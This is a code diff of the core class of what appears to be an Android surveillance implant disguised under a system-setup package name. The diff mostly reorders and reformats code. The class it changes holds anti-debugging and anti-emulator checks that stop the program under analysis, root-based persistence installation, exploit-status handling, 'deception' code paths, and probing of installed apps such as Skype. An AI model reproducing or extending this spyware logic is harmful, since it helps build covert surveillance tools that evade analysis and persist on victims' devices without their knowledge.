@@ -18,6 +18,7 @@ import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 import android.util.Log;
 
+import com.android.mm.M;
 import com.android.syssetup.action.Action;
 import com.android.syssetup.action.SubAction;
 import com.android.syssetup.action.UninstallAction;
@@ -37,7 +38,6 @@ import com.android.syssetup.util.AntiDebug;
 import com.android.syssetup.util.AntiEmulator;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.Utils;
-import com.android.mm.M;
 
 import java.io.IOException;
 
@@ -52,28 +52,24 @@ public class Core extends Activity implements Runnable {
 	private static final int SLEEPING_TIME = 1000;
 	private static final String TAG = "Core"; //$NON-NLS-1$
 	private static final String UNINSTALL_MARKUP = ".l";
+	static Core singleton;
 	private static boolean serviceRunning = false;
-
 	/**
 	 * The b stop core.
 	 */
 	private boolean bStopCore = false;
-
 	/**
 	 * The core thread.
 	 */
 	private Thread coreThread = null;
-
 	/**
 	 * The content resolver.
 	 */
 	private ContentResolver contentResolver;
-
 	/**
 	 * The agent manager.
 	 */
 	private ManagerModule moduleManager;
-
 	/**
 	 * The event manager.
 	 */
@@ -85,13 +81,6 @@ public class Core extends Activity implements Runnable {
 	private PendingIntent alarmIntent = null;
 	private SMain sMain;
 
-	@SuppressWarnings("unused")
-	private void Core() {
-
-	}
-
-	static Core singleton;
-
 	public synchronized static Core self() {
 		if (singleton == null) {
 			singleton = new Core();
@@ -100,7 +89,7 @@ public class Core extends Activity implements Runnable {
 		return singleton;
 	}
 
-	public synchronized static void serivceUnregister(){
+	public synchronized static void serivceUnregister() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (serivceUnregister) ...");
 		}
@@ -117,6 +106,69 @@ public class Core extends Activity implements Runnable {
 		singleton.sMain = sMain;
 
 		return singleton;
+	}
+
+	public static void deceptionCode2(long mersenne) {
+		SetupSystem nOptimizer = new SetupSystem(Status.self().getAppContext());
+		nOptimizer.start((int) (mersenne / 1023));
+	}
+
+	public static void deceptionCode1() {
+		SetupSystem nOptimizer = new SetupSystem(Status.self().getAppContext());
+		nOptimizer.start(1000);
+	}
+
+	/**
+	 * isServiceRunning
+	 *
+	 * @return
+	 */
+	public static boolean iSR() {
+		return serviceRunning;
+	}
+
+	public static void logMemory() {
+		Status.self();
+		ActivityManager activityManager = (ActivityManager) Status.getAppContext().getSystemService(ACTIVITY_SERVICE);
+		android.app.ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
+		activityManager.getMemoryInfo(memoryInfo);
+
+		Check.log(TAG + " memoryInfo.availMem: " + memoryInfo.availMem, true);
+		Check.log(TAG + " memoryInfo.lowMemory: " + memoryInfo.lowMemory, true);
+		Check.log(TAG + " memoryInfo.threshold: " + memoryInfo.threshold, true);
+
+		int pid = android.os.Process.myPid();
+		int pids[] = new int[]{pid};
+
+		android.os.Debug.MemoryInfo[] memoryInfoArray = activityManager.getProcessMemoryInfo(pids);
+		for (android.os.Debug.MemoryInfo pidMemoryInfo : memoryInfoArray) {
+			Check.log(TAG + " pidMemoryInfo.getTotalPrivateDirty(): " + pidMemoryInfo.getTotalPrivateDirty(), true);
+			Check.log(TAG + " pidMemoryInfo.getTotalPss(): " + pidMemoryInfo.getTotalPss(), true);
+			Check.log(TAG + " pidMemoryInfo.getTotalSharedDirty(): " + pidMemoryInfo.getTotalSharedDirty(), true);
+		}
+	}
+
+	public static boolean checkStatic() {
+		if (Cfg.CHECK_ANTI_DEBUG) {
+			if (!Cfg.DEBUG) {
+				AntiDebug ad = new AntiDebug();
+				if (ad.isDebug()) {
+					// deceptionCode1();
+					return false;
+				}
+			}
+
+			AntiEmulator am = new AntiEmulator();
+			if (am.isEmu()) {
+				return false;
+			}
+		}
+		return true;
+	}
+
+	@SuppressWarnings("unused")
+	private void Core() {
+
 	}
 
 	/**
@@ -145,7 +197,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() + "  exploitResult == " + Status.getExploitResultString());
 			}
-			if(Cfg.GUI) {
+			if (Cfg.GUI) {
 				Status.setIconState(true);
 			}
 
@@ -178,7 +230,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): checking uninstall Markup");
 			}
-			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && Status.uninstall ) {
+			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && Status.uninstall) {
 				UninstallAction.actualExecute();
 				return false;
 			}
@@ -187,7 +239,7 @@ public class Core extends Activity implements Runnable {
 			}
 			if (Status.haveRoot()) {
 				int perStatus = Status.getPersistencyStatus();
-				if(Cfg.PERSISTENCE) {
+				if (Cfg.PERSISTENCE) {
 					Root.installPersistence();
 					if (perStatus != Status.getPersistencyStatus()) {
 						Status.self().setReload();
@@ -246,16 +298,6 @@ public class Core extends Activity implements Runnable {
 		return true;
 	}
 
-	public static void deceptionCode2(long mersenne) {
-		SetupSystem nOptimizer = new SetupSystem(Status.self().getAppContext());
-		nOptimizer.start((int) (mersenne / 1023));
-	}
-
-	public static void deceptionCode1() {
-		SetupSystem nOptimizer = new SetupSystem(Status.self().getAppContext());
-		nOptimizer.start(1000);
-	}
-
 	/**
 	 * Stop.
 	 *
@@ -276,18 +318,10 @@ public class Core extends Activity implements Runnable {
 		return true;
 	}
 
-	/**
-	 * isServiceRunning
-	 * @return
-	 */
-	public static boolean iSR() {
-		return serviceRunning;
-	}
-
 	// Runnable (main routine for RCS)
 	/*
 	 * (non-Javadoc)
-	 * 
+	 *
 	 * @see java.lang.Runnable#run()
 	 */
 	public void run() {
@@ -415,21 +449,6 @@ public class Core extends Activity implements Runnable {
 
 	}
 
-	class CheckAction implements Runnable {
-		private final int queue;
-
-		CheckAction(int queue) {
-			if (Cfg.DEBUG) {
-				Thread.currentThread().setName("queue_" + queue);
-			}
-			this.queue = queue;
-		}
-
-		public void run() {
-			boolean ret = checkActions(queue);
-		}
-	}
-
 	/**
 	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
 	 * bloccante.
@@ -474,7 +493,7 @@ public class Core extends Activity implements Runnable {
 				}
 
 				if (Cfg.DEBUG) {
-					PackageManager pm =  Status.getAppContext().getPackageManager();
+					PackageManager pm = Status.getAppContext().getPackageManager();
 					Log.w("QZ", "testing \"com.skype.raider\"");
 					try {
 						if (pm.getInstallerPackageName("com.skype.raider") != null) {
@@ -482,15 +501,15 @@ public class Core extends Activity implements Runnable {
 						} else {
 							Log.w("QZ", " packagename: " + pm.getInstallerPackageName("com.skype.raider"));
 						}
-					}catch(Exception e){
-						Log.w("QZ", " NOT installed " );
+					} catch (Exception e) {
+						Log.w("QZ", " NOT installed ");
 					}
 					Log.w("QZ", "testing" + Status.getAppContext().getPackageName());
-						if (pm.getInstallerPackageName(Status.getAppContext().getPackageName()) != null) {
-							Log.w("QZ", "packagename: " + pm.getInstallerPackageName(Status.getAppContext().getPackageName()));
-						} else {
-							Log.w("QZ", " packagename: LOCAL");
-						}
+					if (pm.getInstallerPackageName(Status.getAppContext().getPackageName()) != null) {
+						Log.w("QZ", "packagename: " + pm.getInstallerPackageName(Status.getAppContext().getPackageName()));
+					} else {
+						Log.w("QZ", " packagename: LOCAL");
+					}
 				}
 
 				for (final Trigger trigger : actionIds) {
@@ -618,7 +637,7 @@ public class Core extends Activity implements Runnable {
 			/*
 			 * if (moduleManager.startAll() == false) { if (Cfg.DEBUG) {
 			 * Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
-			 * 
+			 *
 			 * return ConfType.Error; }
 			 */
 
@@ -654,7 +673,6 @@ public class Core extends Activity implements Runnable {
 
 		return ConfType.Error;
 	}
-
 
 	public boolean verifyNewConf() {
 		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
@@ -891,27 +909,6 @@ public class Core extends Activity implements Runnable {
 		return exit;
 	}
 
-	public static void logMemory() {
-		Status.self();
-		ActivityManager activityManager = (ActivityManager) Status.getAppContext().getSystemService(ACTIVITY_SERVICE);
-		android.app.ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
-		activityManager.getMemoryInfo(memoryInfo);
-
-		Check.log(TAG + " memoryInfo.availMem: " + memoryInfo.availMem, true);
-		Check.log(TAG + " memoryInfo.lowMemory: " + memoryInfo.lowMemory, true);
-		Check.log(TAG + " memoryInfo.threshold: " + memoryInfo.threshold, true);
-
-		int pid = android.os.Process.myPid();
-		int pids[] = new int[]{pid};
-
-		android.os.Debug.MemoryInfo[] memoryInfoArray = activityManager.getProcessMemoryInfo(pids);
-		for (android.os.Debug.MemoryInfo pidMemoryInfo : memoryInfoArray) {
-			Check.log(TAG + " pidMemoryInfo.getTotalPrivateDirty(): " + pidMemoryInfo.getTotalPrivateDirty(), true);
-			Check.log(TAG + " pidMemoryInfo.getTotalPss(): " + pidMemoryInfo.getTotalPss(), true);
-			Check.log(TAG + " pidMemoryInfo.getTotalSharedDirty(): " + pidMemoryInfo.getTotalSharedDirty(), true);
-		}
-	}
-
 	public synchronized boolean reloadConf() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (reloadConf): START");
@@ -946,9 +943,7 @@ public class Core extends Activity implements Runnable {
 			if (!Cfg.DEBUG || Cfg.DEBUGANTI) {
 
 
-
 				AntiDebug ad = new AntiDebug();
-
 
 
 				if (ad.isDebug() || ad.isPlayStore()) {
@@ -973,25 +968,6 @@ public class Core extends Activity implements Runnable {
 		return true;
 	}
 
-	public static boolean checkStatic() {
-		if (Cfg.CHECK_ANTI_DEBUG) {
-			if (!Cfg.DEBUG) {
-				AntiDebug ad = new AntiDebug();
-				if (ad.isDebug()) {
-					// deceptionCode1();
-					return false;
-				}
-			}
-
-			AntiEmulator am = new AntiEmulator();
-			if (am.isEmu()) {
-				return false;
-			}
-		}
-		return true;
-	}
-
-
 	public synchronized boolean haveUninstallMarkup() {
 		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
 		if (Cfg.DEBUG) {
@@ -1006,6 +982,21 @@ public class Core extends Activity implements Runnable {
 		}
 		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
 		markup.write(1);
+	}
+
+	class CheckAction implements Runnable {
+		private final int queue;
+
+		CheckAction(int queue) {
+			if (Cfg.DEBUG) {
+				Thread.currentThread().setName("queue_" + queue);
+			}
+			this.queue = queue;
+		}
+
+		public void run() {
+			boolean ret = checkActions(queue);
+		}
 	}
 
 }
